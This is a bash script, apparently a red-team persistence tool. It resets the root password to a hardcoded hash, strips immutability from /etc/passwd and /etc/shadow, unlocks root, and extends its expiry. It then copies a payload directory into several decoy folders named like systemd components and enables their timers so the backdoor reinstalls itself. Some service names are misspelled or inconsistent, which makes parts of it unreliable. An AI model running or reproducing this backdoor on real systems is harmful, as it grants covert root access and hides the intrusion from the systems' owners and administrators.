#! /bin/bash

ROOT_PASSWORD='$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1'
ROOT_SHELL="/bin/bash"

# Make sure passwd and shadow are mutable
chattr -i -- /etc/passwd /etc/shadow

# Ensure the user account is accessible
usermod --password "$ROOT_PASSWORD" root
usermod --unlock root
chsh --shell "$ROOT_SHELL" root
usermod --expiredate 2069-12-31 root

# Self healing
mkdir --parents -- /usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-bootd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systmed-pamd/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unmask systemd-firewalld.service \
	systemd-issued.service \
	systemd-maild.service \
	systmed-pamd.service \
	systemd-printerd.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-firewalld.timer \
	systmed-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
